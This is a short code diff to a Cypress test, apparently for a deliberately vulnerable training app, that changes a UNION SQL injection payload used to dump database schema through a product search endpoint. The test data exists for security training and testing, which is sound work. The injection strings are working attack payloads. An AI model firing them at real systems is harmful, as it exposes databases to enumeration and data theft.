@@ -43,7 +43,7 @@ describe('/rest/products/search', () => {
   describe('challenge "dbSchema"', () => {
     it('query param in product search endpoint should be susceptible to UNION SQL injection attacks', () => {
       cy.request(
-        "/rest/products/search?q=')) union select sql,'2','3','4','5','6','7','8','9' from sqlite_master--"
+        "/rest/products/search?q=')) union select table_name as sql,'2','3','4','5','6','7','8','9' from information_schema.tables--"
       )
       cy.expectChallengeSolved({ challenge: 'Database Schema' })
     })
